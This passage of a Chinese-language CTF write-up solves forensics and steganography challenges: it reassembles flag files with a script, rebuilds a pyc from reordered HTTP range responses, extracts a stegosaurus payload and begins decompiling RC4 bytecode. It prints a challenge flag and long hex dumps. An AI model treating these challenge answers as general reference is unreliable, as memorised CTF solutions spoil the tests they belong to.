class="number">0x010E</span>,<span class="number">0x039D</span>,<span class="number">0x0246</span>,<span class="number">0x0287</span>,<span class="number">0x01B9</span>,<span class="number">0x021A</span>,<span class="number">0x010C</span>,<span class="number">0x0394</span>,<span class="number">0x0250</span>,<span class="number">0x00F3</span>,<span class="number">0x03A2</span>,<span class="number">0x0000</span>,<span class="number">0x0116</span>,<span class="number">0x03AD</span>,<span class="number">0x0377</span>,<span class="number">0x011A</span>,<span class="number">0x02EF</span>,<span class="number">0x02CA</span>,<span class="number">0x0153</span>,<span class="number">0x0312</span>,<span class="number">0x01E8</span>,<span class="number">0x034A</span>,<span class="number">0x0311</span>,<span class="number">0x0229</span>,<span class="number">0x02AF</span>,<span class="number">0x03A5</span>,<span class="number">0x0359</span>,<span class="number">0x036D</span>,<span class="number">0x01A6</span>,<span class="number">0x023B</span>,<span class="number">0x021D</span>,<span class="number">0x00FA</span>,<span class="number">0x02D0</span>,<span class="number">0x0335</span>,<span class="number">0x00BD</span>,<span class="number">0x025F</span>,<span class="number">0x0326</span>,<span class="number">0x037F</span>,<span class="number">0x03A8</span>,<span class="number">0x01EA</span>,<span class="number">0x011B</span>,<span class="number">0x029E</span>,<span class="number">0x03CC</span>,<span class="number">0x0201</span>,<span class="number">0x038A</span>,<span class="number">0x016A</span>,<span class="number">0x0380</span>,<span class="number">0x0037</span>,<span class="number">0x013F</span>,<span class="number">0x0080</span>,<span class="number">0x029B</span>,<span class="number">0x01CA</span>,<span class="number">0x0253</span>,<span class="number">0x02E9</span>,<span class="number">0x0088</span>,<span class="number">0x0370</span>,<span class="number">0x01C8</span>,<span class="number">0x02F1</span>,<span class="number">0x03B3</span>,<span class="number">0x0205</span>,<span class="number">0x003A</span>,<span class="number">0x0317</span>,<span class="number">0x01AD</span>,<span class="number">0x0125</span>,<span class="number">0x0187</span>,<span class="number">0x0197</span>,<span class="number">0x0237</span>,<span class="number">0x014E</span>,<span class="number">0x025E</span>,<span class="number">0x036A</span>,<span class="number">0x011F</span>,<span class="number">0x020F</span>,<span class="number">0x00A9</span>,<span class="number">0x014C</span>,<span class="number">0x008E</span>,<span class="number">0x030C</span>,<span class="number">0x032B</span>,<span class="number">0x0052</span>,<span class="number">0x0141</span>,<span class="number">0x0355</span>,<span class="number">0x0297</span>,<span class="number">0x0295</span>,<span class="number">0x0275</span>,<span class="number">0x013A</span>,<span class="number">0x0350</span>,<span class="number">0x0157</span>,<span class="number">0x02AB</span>,<span class="number">0x03FF</span>,<span class="number">0x00F7</span>,<span class="number">0x0098</span>,<span class="number">0x00DD</span>,<span class="number">0x015E</span>,<span class="number">0x0387</span>,<span class="number">0x01E4</span>,<span class="number">0x0087</span>,<span class="number">0x0055</span>,<span class="number">0x0159</span>,<span class="number">0x013C</span>,<span class="number">0x0105</span>,<span class="number">0x019B</span>,<span class="number">0x01D1</span>,<span class="number">0x0194</span>,<span class="number">0x02CF</span>,<span class="number">0x0045</span>,<span class="number">0x02B0</span>,<span class="number">0x00C6</span>,<span class="number">0x0022</span>,<span class="number">0x026F</span>,<span class="number">0x01E0</span>,<span class="number">0x01DD</span>,<span class="number">0x033B</span>,<span class="number">0x03FD</span>,<span class="number">0x01D2</span>,<span class="number">0x0154</span>,<span class="number">0x005D</span>,<span class="number">0x0389</span>,<span class="number">0x0024</span>,<span class="number">0x039F</span>,<span class="number">0x01DF</span>,<span class="number">0x028D</span>,<span class="number">0x03BB</span>,<span class="number">0x0245</span>,<span class="number">0x0011</span>,<span class="number">0x0003</span>,<span class="number">0x0027</span>,<span class="number">0x00C7</span>,<span class="number">0x02BE</span>,<span class="number">0x0047</span>,<span class="number">0x00C9</span>,<span class="number">0x02B6</span>,<span class="number">0x01B5</span>,<span class="number">0x009B</span>,<span class="number">0x006E</span>,<span class="number">0x03C3</span>,<span class="number">0x016E</span>,<span class="number">0x00B5</span>,<span class="number">0x025D</span>,<span class="number">0x0059</span>,<span class="number">0x0016</span>,<span class="number">0x0008</span>,<span class="number">0x002D</span>,<span class="number">0x0066</span>,<span class="number">0x007A</span>,<span class="number">0x037B</span>,<span class="number">0x01BF</span>,<span class="number">0x0308</span>,<span class="number">0x02ED</span>,<span class="number">0x035C</span>,<span class="number">0x02CD</span>,<span class="number">0x00E5</span>,<span class="number">0x00C5</span>,<span class="number">0x0208</span>,<span class="number">0x02FB</span>,<span class="number">0x0280</span>,<span class="number">0x01CF</span>,<span class="number">0x025A</span>,<span class="number">0x03DA</span>,<span class="number">0x018B</span>,<span class="number">0x017A</span>,<span class="number">0x02B8</span>,<span class="number">0x0104</span>,<span class="number">0x0190</span>,<span class="number">0x003D</span>,<span class="number">0x03BD</span>,<span class="number">0x0089</span>,<span class="number">0x0204</span>,<span class="number">0x0391</span>,<span class="number">0x0289</span>,<span class="number">0x014F</span>,<span class="number">0x0274</span>,<span class="number">0x01C3</span>,<span class="number">0x0322</span>,<span class="number">0x0151</span>,<span class="number">0x0196</span>,<span class="number">0x02C2</span>,<span class="number">0x03D2</span>,<span class="number">0x03F7</span>,<span class="number">0x0294</span>,<span class="number">0x01D9</span>,<span class="number">0x00BA</span>,<span class="number">0x0158</span>,<span class="number">0x03FE</span>,<span class="number">0x03B1</span>,<span class="number">0x03B5</span>,<span class="number">0x01ED</span>,<span class="number">0x014D</span>,<span class="number">0x0136</span>,<span class="number">0x023A</span>,<span class="number">0x0042</span>,<span class="number">0x0374</span>,<span class="number">0x0315</span>,<span class="number">0x0395</span>,<span class="number">0x00E9</span>,<span class="number">0x0342</span>,<span class="number">0x00DE</span>,<span class="number">0x00D1</span>,<span class="number">0x01B2</span>,<span class="number">0x0340</span>,<span class="number">0x0020</span>,<span class="number">0x004E</span>,<span class="number">0x015C</span>,<span class="number">0x013B</span>,<span class="number">0x00AC</span>,<span class="number">0x0363</span>,<span class="number">0x02D4</span>,<span class="number">0x0223</span>,<span class="number">0x0026</span>,<span class="number">0x00DB</span>,<span class="number">0x017E</span>,<span class="number">0x0123</span>,<span class="number">0x006B</span>,<span class="number">0x02DD</span>,<span class="number">0x02FF</span>,<span class="number">0x0299</span>,<span class="number">0x00F1</span>,<span class="number">0x0084</span>,<span class="number">0x0217</span>,<span class="number">0x0014</span>,<span class="number">0x0090</span>,<span class="number">0x0176</span>,<span class="number">0x0206</span>,<span class="number">0x02B4</span>,<span class="number">0x023E</span>,<span class="number">0x0372</span>,<span class="number">0x032F</span>,<span class="number">0x023D</span>,<span class="number">0x01C0</span>,<span class="number">0x02E6</span>,<span class="number">0x0220</span>,<span class="number">0x0072</span>,<span class="number">0x02FE</span>,<span class="number">0x03C9</span>,<span class="number">0x01D0</span>,<span class="number">0x0053</span>,<span class="number">0x0329</span>,<span class="number">0x01C6</span>,<span class="number">0x033D</span>,<span class="number">0x027C</span>,<span class="number">0x03B9</span>,<span class="number">0x0369</span>,<span class="number">0x0028</span>,<span class="number">0x0050</span>,<span class="number">0x02DA</span>,<span class="number">0x00D9</span>,<span class="number">0x01E9</span>,<span class="number">0x001A</span>,<span class="number">0x02CB</span>,<span class="number">0x0172</span>,<span class="number">0x02E8</span>,<span class="number">0x0356</span>,<span class="number">0x0191</span>,<span class="number">0x02EE</span>,<span class="number">0x0095</span>,<span class="number">0x01C2</span>,<span class="number">0x0094</span>,<span class="number">0x007F</span>,<span class="number">0x0251</span>,<span class="number">0x0184</span>,<span class="number">0x0144</span>,<span class="number">0x024B</span>,<span class="number">0x03B0</span>,<span class="number">0x0121</span>,<span class="number">0x0203</span>,<span class="number">0x0264</span>,<span class="number">0x022E</span>,<span class="number">0x0348</span>,<span class="number">0x02FD</span>,<span class="number">0x0373</span>,<span class="number">0x0249</span>,<span class="number">0x0036</span>,<span class="number">0x02C8</span>,<span class="number">0x027B</span>,<span class="number">0x0226</span>,<span class="number">0x016D</span>,<span class="number">0x03C7</span>,<span class="number">0x0017</span>,<span class="number">0x0040</span>,<span class="number">0x0386</span>,<span class="number">0x0262</span>,<span class="number">0x0270</span>,<span class="number">0x0252</span>,<span class="number">0x02E5</span>,<span class="number">0x0234</span>,<span class="number">0x010F</span>,<span class="number">0x03C4</span>,<span class="number">0x010B</span>,<span class="number">0x0150</span>,<span class="number">0x0293</span>,<span class="number">0x02B9</span>,<span class="number">0x016F</span>,<span class="number">0x0382</span>,<span class="number">0x03AB</span>,<span class="number">0x0189</span>,<span class="number">0x02B7</span>,<span class="number">0x039B</span>,<span class="number">0x0146</span>,<span class="number">0x01F2</span>,<span class="number">0x030F</span>,<span class="number">0x00CB</span>,<span class="number">0x0054</span>,<span class="number">0x00C8</span>,<span class="number">0x01DB</span>,<span class="number">0x035E</span>,<span class="number">0x0388</span>,<span class="number">0x0083</span>,<span class="number">0x001D</span>,<span class="number">0x007B</span>,<span class="number">0x00FE</span>,<span class="number">0x0181</span>,<span class="number">0x010A</span>,<span class="number">0x0033</span>,<span class="number">0x01E2</span>,<span class="number">0x03C1</span>,<span class="number">0x03E4</span>,<span class="number">0x02FA</span>,<span class="number">0x0163</span>,<span class="number">0x0358</span>,<span class="number">0x0069</span>,<span class="number">0x00E7</span>,<span class="number">0x02E0</span>,<span class="number">0x017D</span>,<span class="number">0x00EE</span>,<span class="number">0x0290</span>,<span class="number">0x0166</span>,<span class="number">0x027E</span>,<span class="number">0x003B</span>,<span class="number">0x02F4</span>,<span class="number">0x00D3</span>,<span class="number">0x0341</span>,<span class="number">0x0279</span>,<span class="number">0x0179</span>,<span class="number">0x0228</span>,<span class="number">0x0152</span>,<span class="number">0x02B2</span>,<span class="number">0x036C</span>,<span class="number">0x0119</span>,<span class="number">0x0336</span>,<span class="number">0x03AA</span>,<span class="number">0x0174</span>,<span class="number">0x029D</span>,<span class="number">0x0117</span>,<span class="number">0x03A7</span>,<span class="number">0x023F</span>,<span class="number">0x02D6</span>,<span class="number">0x0218</span>,<span class="number">0x01FD</span>,<span class="number">0x0134</span>,<span class="number">0x0019</span>,<span class="number">0x02C0</span>,<span class="number">0x000D</span>,<span class="number">0x0161</span>,<span class="number">0x032D</span>,<span class="number">0x0010</span>,<span class="number">0x0149</span>,<span class="number">0x0167</span>,<span class="number">0x002E</span>,<span class="number">0x004B</span>,<span class="number">0x0200</span>,<span class="number">0x03C6</span>,<span class="number">0x0046</span>,<span class="number">0x00B3</span>,<span class="number">0x005A</span>,<span class="number">0x01D5</span>,<span class="number">0x0202</span>,<span class="number">0x0313</span>,<span class="number">0x0131</span>,<span class="number">0x012C</span>,<span class="number">0x0332</span>,<span class="number">0x00B2</span>,<span class="number">0x0213</span>,<span class="number">0x01A5</span>,<span class="number">0x02EA</span>,<span class="number">0x026A</span>,<span class="number">0x02D5</span>,<span class="number">0x000E</span>,<span class="number">0x007D</span>,<span class="number">0x03B2</span>,<span class="number">0x02C9</span>,<span class="number">0x00EB</span>,<span class="number">0x0031</span>,<span class="number">0x03D5</span>,<span class="number">0x00B4</span>,<span class="number">0x01E7</span>,<span class="number">0x00BC</span>,<span class="number">0x039A</span>,<span class="number">0x0155</span>,<span class="number">0x0367</span>,<span class="number">0x032A</span>,<span class="number">0x0156</span>,<span class="number">0x0303</span>,<span class="number">0x0285</span>,<span class="number">0x0351</span>,<span class="number">0x0258</span>,<span class="number">0x02D1</span>,<span class="number">0x00A7</span>,<span class="number">0x027F</span>,<span class="number">0x0112</span>,<span class="number">0x01EC</span>,<span class="number">0x0316</span>,<span class="number">0x02C6</span>,<span class="number">0x002B</span>,<span class="number">0x00A0</span>,<span class="number">0x0284</span>,<span class="number">0x0048</span>,<span class="number">0x00CE</span>,<span class="number">0x01E3</span>,<span class="number">0x0241</span>,<span class="number">0x00B0</span>,<span class="number">0x025C</span>,<span class="number">0x02A6</span>,<span class="number">0x01CC</span>,<span class="number">0x0306</span>,<span class="number">0x02C4</span>,<span class="number">0x00B1</span>,<span class="number">0x0240</span>,<span class="number">0x02E7</span>,<span class="number">0x03DF</span>,<span class="number">0x029C</span>,<span class="number">0x0331</span>,<span class="number">0x00DF</span>,<span class="number">0x0075</span>,<span class="number">0x0005</span>,<span class="number">0x006A</span>,<span class="number">0x03B7</span>,<span class="number">0x003F</span>,<span class="number">0x00D2</span>,<span class="number">0x01F3</span>,<span class="number">0x026B</span>,<span class="number">0x032C</span>,<span class="number">0x00FC</span>,<span class="number">0x0058</span>,<span class="number">0x01D4</span>,<span class="number">0x0393</span>,<span class="number">0x0324</span>,<span class="number">0x01AE</span>,<span class="number">0x038F</span>,<span class="number">0x018C</span>,<span class="number">0x01FE</span>,<span class="number">0x03C2</span>,<span class="number">0x0182</span>,<span class="number">0x015D</span>,<span class="number">0x00E6</span>,<span class="number">0x020D</span>,<span class="number">0x0175</span>,<span class="number">0x012D</span>,<span class="number">0x0032</span>,<span class="number">0x03CA</span>,<span class="number">0x02E1</span>,<span class="number">0x038B</span>,<span class="number">0x03D4</span>,<span class="number">0x0277</span>,<span class="number">0x02F9</span>,<span class="number">0x0257</span>,<span class="number">0x02A7</span>,<span class="number">0x031A</span>,<span class="number">0x00A4</span>,<span class="number">0x03DC</span>,<span class="number">0x01C5</span>,<span class="number">0x024C</span>,<span class="number">0x0211</span>,<span class="number">0x00C3</span>,<span class="number">0x0244</span>,<span class="number">0x001E</span>,<span class="number">0x022A</span>,<span class="number">0x0283</span>,<span class="number">0x027D</span>,<span class="number">0x035F</span>,<span class="number">0x00DC</span>,<span class="number">0x03A6</span>,<span class="number">0x0379</span>,<span class="number">0x033F</span>,<span class="number">0x0376</span>,<span class="number">0x00E8</span>,<span class="number">0x0118</span>,<span class="number">0x0145</span>,<span class="number">0x03D3</span>,<span class="number">0x0057</span>,<span class="number">0x000B</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> indexes:</span><br><span class="line">    fileName = <span class="string">f&quot;flag_f<span class="subst">&#123;<span class="built_in">str</span>(<span class="built_in">int</span>(index)).zfill(<span class="number">5</span>)&#125;</span>&quot;</span></span><br><span class="line">    result += <span class="built_in">open</span>(fileName, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;b.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">file.write(result)</span><br><span class="line">file.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下包含 flag 的文本。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!Sdk*t eiW!BJ9$QpR. pIk&#123;V#t:NE;J8M&#123;Qi&gt;W%|1vw&lt;9_*2AG\SX_6&#123;)&#39;n4)GwcPx8gp[6Z_&#39;.#Y(&#x3D;zCs&#x2F;2*^DwpC6@&#x3D;KBz\+0ngA@C(cJSiE&#39;ShHjW,*Xu&#123;Y&gt;5rGyMWX_mY,htG1KLE&#96;pNNMYd?U\SF&lt;%O,qeVflr$,CO@V.s-%.@C&#39;&amp;I2[36?&lt;k)N^Z0~IgP-k&#x3D;L-Ip0URu_&lt;P6T?&#x2F;LF\~K~q6%76&#125;!_WR&amp;nojVK&#96;KGYZwx&quot;G4^4&#x3D;&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z&#x2F;Xh&#x3D;V(J&#96;jus9Jw-Pmp1&#x3D;[|b5;&quot;Z&#123;[qNI&amp;9&#x2F;.2@b&gt;&#39;Vxo &#123;1)xT_&#39;3FoRIP~O&#96;&amp;!K&#39;ZAKM&lt;Hrg$D_*&gt;8G%UT&#123;oN41|4P42S~6*g2KJ&#125;o,8j&#x2F;]&amp;FimP0V2c::+&#123;#;Bj@Cd\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!&#x2F;bbB(v&#x2F;Q(6ez&#123;bKoH&#39;-B&#39;*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\+&#96;abDa7w16BySRx-#D&#x2F;-a1O55Q&#96;F&lt;75&#123;8f)4rlgQW]K&#x3D;oT1J$Ar&#x3D; W$LW9!~TphteN&#x3D;b&amp;s&#125;.714G_8W~!@8&#x3D;%gh%&quot;K:&lt;@7o*5+y+&#125;+fCF&#39;NEYN0&#123;P4T_hz(3|Y7ZA1fsu\B6bxi#_+wKPs^C1^Ywa,&#123;&#39;&amp;i]Hq+P8&lt;WQ5sKu!abFLAG&#123;Dir3ct0ry_jYa_n41&#125;R:k_#z^&#39;mT?,3$H &quot;W+xr-Yzn-D-ribi,wKf|&amp;$2:&#x2F;q?8:jmcI|4L:+&#96;KDx])5+A_m13&#x2F;7R1VQ:[Dc&amp;.TcvPv$tOb&#125;X&amp;-K&#39;f:.&lt;,bO~0r,&#x3D;olgKP&amp;x U %(HFjNtCDaJiHW+N1WK&#x3D;(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn&#x3D;k#7i,3YHK_Z;o%8[xZy;:&lt;1&#125;OT1IHSn&gt;gn&#96;n;YI9[M&#39;t@v%&#125;Iz0fmVl#ls+aI\: 6?|VvGHD~Q0O4&#123;-.siztGve H&lt;f@kXEt@WWHW&quot;,81m*S1lbQZ+mK9rB&#39;TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*&#125;.7pRx&quot;t1vzM):FL3r@:-C1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Dir3ct0ry_jYa_n41&#125;</span><br></pre></td></tr></table></figure><h3 id="ExtremelySlow"><a href="#ExtremelySlow" class="headerlink" title="ExtremelySlow"></a>ExtremelySlow</h3><p>追踪 TCP 流可见响应中含有 <code>content-range: bytes 641-641/1987</code> 提示了字符顺序。使用 WireShark 导出分组解析结果后使用正则表达式将内容和顺序提取出来，放到 Excel 中排好序，可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6f 0d 0d 0a 00 00 00 00 af e7 b5 60 9a 06 00 00 e3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 00 00 00 40 00 00 00 73 1a 01 00 00 64 00 64 01 6c 00 5a 00 64 00 64 02 6c 01 6d 02 5a 02 01 00 64 03 64 04 84 00 5a 03 64 05 64 06 84 00 5a 04 64 07 64 08 84 00 5a 05 64 09 64 0a 84 00 5a 06 65 07 64 0b 6b 02 72 8b 64 0c 5a 08 64 0d 5a 09 64 0e 5a 0a 64 0f 5a 0b 64 10 5a 0c 64 11 64 12 64 13 64 14 64 15 9c 04 5a 0d 64 16 64 17 64 18 64 19 64 1a 9c 04 5a 0e 65 0d 64 1b 64 1c 84 00 65 0e 44 00 83 01 4f 00 5a 0d 65 0d 64 1d 64 1e 84 00 65 0a 44 00 83 01 4f 00 5a 0d 65 05 65 0f 65 10 64 1f 64 20 84 00 65 11 65 0d a0 12 a1 00 83 01 83 02 83 01 83 01 5a 13 65 14 65 06 65 08 65 13 83 02 a0 15 a1 00 83 01 01 00 65 00 6a 16 6a 17 a0 18 a1 00 5a 19 65 06 65 09 65 13 83 02 5a 09 65 06 65 19 65 13 83 02 5a 1a 65 02 65 1a 83 01 a0 1b a1 00 65 0b 6b 02 72 83 65 14 65 06 65 0c 65 13 83 02 a0 15 a1 00 83 01 01 00 64 01 53 00 65 14 65 09 a0 15 a1 00 83 01 01 00 64 01 53 00 64 01 53 00 29 21 e9 00 00 00 00 4e a9 01 da 06 73 68 61 32 35 36 63 01 00 00 00 00 00 00 00 00 00 00 00 05 00 00 00 05 00 00 00 43 00 00 00 73 60 00 00 00 74 00 7c 00 83 01 7d 01 74 01 74 02 64 01 83 01 83 01 7d 02 64 02 7d 03 74 02 64 01 83 01 44 00 5d 1d 7d 04 7c 03 7c 02 7c 04 19 00 17 00 7c 00 7c 04 7c 01 16 00 19 00 17 00 64 01 16 00 7d 03 7c 02 7c 03 19 00 7c 02 7c 04 19 00 02 00 7c 02 7c 04 3c 00 7c 02 7c 03 3c 00 71 10 7c 02 53 00 29 03 4e e9 00 01 00 00 72 01 00 00 00 29 03 da 03 6c 65 6e da 04 6c 69 73 74 da 05 72 61 6e 67 65 29 05 da 03 6b 65 79 da 09 6b 65 79 6c 65 6e 67 74 68 da 01 53 da 01 6a da 01 69 a9 00 72 0d 00 00 00 fa 07 6d 61 69 6e 2e 70 79 da 03 4b 53 41 06 00 00 00 73 0e 00 00 00 00 01 08 01 0c 01 04 01 0c 01 1c 01 1c 01 72 0f 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 04 00 00 00 63 00 00 00 73 62 00 00 00 81 00 64 01 7d 01 64 01 7d 02 09 f0 7c 01 64 03 17 b4 64 04 16 55 7d 01 7c 02 7c 00 7c 01 19 16 17 36 64 04 16 c5 7d 02 7c 00 7c 02 19 6f 7c 00 7c 01 19 db 02 c9 7c 00 7c 01 3c ea 7c 00 7c 02 3c 64 7c 00 7c 00 7c 01 19 04 7c 00 7c 02 19 15 17 62 64 04 16 00 19 00 7d 03 7c 03 56 00 01 00 71 06 29 05 4e 72 01 00 00 00 54 e9 01 00 00 00 72 04 00 00 00 72 0d 00 00 00 29 04 72 0a 00 00 00 72 0c 00 00 00 72 0b 00 00 00 da 01 4b 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 04 50 52 47 41 10 00 00 00 73 12 00 00 00 02 01 04 01 04 01 02 01 0c 01 10 01 1a 01 18 01 06 fb 72 12 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 02 00 00 00 43 00 00 00 73 10 00 00 00 74 00 7c 00 83 01 7d 01 74 01 7c 01 83 01 53 11 29 01 4e 29 02 72 0f 00 00 00 72 12 00 00 00 29 02 72 08 00 00 00 72 0a 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 03 52 43 34 1a 00 00 00 73 04 00 00 00 00 01 08 01 72 13 00 00 00 63 02 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 05 00 00 00 03 00 00 00 73 16 00 00 00 74 00 74 01 87 00 66 01 64 01 64 02 84 08 7c 00 83 02 83 01 53 a2 29 03 4e 63 01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 03 00 00 00 13 00 00 00 73 0c 00 00 00 7c 00 88 00 a0 00 a1 00 41 b0 53 cd 29 01 4e 29 01 da 08 5f 5f 6e 65 78 74 5f 5f 29 01 da 01 78 29 01 da 06 73 74 72 65 61 6d 72 0d 00 00 00 72 0e 00 00 00 da 08 3c 6c 61 6d 62 64 61 3e 1f 00 00 00 f3 00 00 00 00 fa 15 78 6f 72 2e 3c 6c 6f 63 61 6c 73 3e 2e 3c 6c 61 6d 62 64 61 3e 29 02 da 05 62 79 74 65 73 da 03 6d 61 70 29 02 da 01 70 72 16 00 00 00 72 0d 00 00 00 29 01 72 16 00 00 00 72 0e 00 00 00 da 03 78 6f 72 1e 00 00 00 73 02 00 00 00 00 01 72 1d 00 00 00 da 08 5f 5f 6d 61 69 6e 5f 5f f3 1c 00 00 00 f6 ef 10 48 a9 0f 9f b5 80 c1 78 64 ae d3 03 b2 84 c2 b4 0e c8 f3 3c 15 31 19 0a 8f f3 0e 00 00 00 24 0d 39 a3 18 dd 57 c9 97 f3 a7 a8 52 7e f3 03 00 00 00 67 65 6f f3 20 00 00 00 7d ce 60 be 6a a2 12 30 b5 8a 94 14 7b a3 86 c8 c7 01 98 a3 5f 91 d8 82 54 2a 56 ab e0 a1 14 31 f3 34 00 00 00 51 5f e2 f8 8c 11 4d 7d 27 3c 40 ce 54 f6 3f 5f 6d a4 f8 b4 ea ca c7 3a b9 e6 06 8b eb fa 62 48 85 78 4a 33 24 dd de b6 dc a0 b8 62 96 31 b7 13 3d 17 13 b1 e9 73 00 00 00 e9 61 00 00 00 e9 75 00 00 00 e9 72 00 00 00 a9 04 e9 02 00 00 00 e9 08 00 00 00 e9 0b 00 00 00 e9 0a 00 00 00 e9 77 00 00 00 e9 74 00 00 00 e9 7c 00 00 00 e9 7f 00 00 00 a9 04 e9 03 00 00 00 e9 07 00 00 00 e9 09 00 00 00 e9 0c 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 06 00 00 00 43 00 00 00 73 1a 00 00 00 69 00 7c 00 5d 09 7d 01 7c 01 7c 01 74 00 7c 01 19 f0 41 7d 93 02 71 02 53 49 72 0d 00 00 00 29 01 da 01 6e 29 02 da 02 2e 30 72 15 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 0a 3c 64 69 63 74 63 6f 6d 70 3e 2c 00 00 00 72 18 00 00 00 72 38 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 03 00 00 00 63 00 00 00 73 1c 00 00 00 81 00 7c 00 5d 09 7d 01 7c 01 a0 00 a1 00 7c 01 66 02 56 32 01 d6 71 02 64 00 53 22 29 01 4e 29 01 da 09 62 69 74 5f 63 6f 75 6e 74 29 02 72 37 00 00 00 72 0c 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 09 3c 67 65 6e 65 78 70 72 3e 2d 00 00 00 72 18 00 00 00 72 3a 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 02 00 00 00 43 00 00 00 73 08 00 00 00 7c 00 64 01 19 e5 53 0a 29 02 4e 72 10 00 00 00 72 0d 00 00 00 29 01 72 15 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 72 17 00 00 00 2f 00 00 00 72 18 00 00 00 72 17 00 00 00 29 1c da 03 73 79 73 da 07 68 61 73 68 6c 69 62 72 03 00 00 00 72 0f 00 00 00 72 12 00 00 00 72 13 00 00 00 72 1d 00 00 00 da 08 5f 5f 6e 61 6d 65 5f 5f da 01 77 da 01 65 da 01 62 da 01 73 da 01 74 da 01 6d 72 36 00 00 00 72 06 00 00 00 72 1b 00 00 00 da 06 73 6f 72 74 65 64 da 05 69 74 65 6d 73 72 16 00 00 00 da 05 70 72 69 6e 74 da 06 64 65 63 6f 64 65 da 05 73 74 64 69 6e da 06 62 75 66 66 65 72 da 04 72 65 61 64 72 1c 00 00 00 da 01 63 da 06 64 69 67 65 73 74 72 0d 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 08 3c 6d 6f 64 75 6c 65 3e 01 00 00 00 73 32 00 00 00 00 02 08 01 0c 02 08 0a 08 0a 08 04 08 03 08 01 04 01 04 03 04 01 04 02 04 01 0e 01 0e 01 12 01 12 02 1e 01 12 01 0c 01 0a 02 0a 01 10 01 16 02 10 e9 </span><br></pre></td></tr></table></figure><p>将其转为十六进制后存储为文件可得一个 Python 3.10 的 pyc 文件。使用 stegosaurus 解隐写可以得到如下内容。此时需要修改  stegosaurus 工具的源码，将 <code>payload = str(payloadBytes, &quot;utf8&quot;)</code> 修改作 <code>payload = payloadBytes</code> 才能得到无法解码的字节载荷。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Extracted payload: bytearray(b&#39;\xe5\n2\xd6&quot;\xf0&#125;I\xb0\xcd\xa2\x11\xf0\xb4U\x166\xc5o\xdb\xc9\xead\x04\x15b&#39;)</span><br></pre></td></tr></table></figure><p>写脚本可以将 pyc 转换成字节码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;extracted.pyc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.seek(<span class="number">16</span>)</span><br><span class="line">  dis.dis(marshal.load(f))</span><br></pre></td></tr></table></figure><p>将字节码手动转译成 Python 代码并将解隐写得到的内容添加进去，可以得到如下脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KSA</span>(<span class="params">key</span>):</span></span><br><span class="line">    keylength = <span class="built_in">len</span>(key)</span><br><span class="line">    S=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span 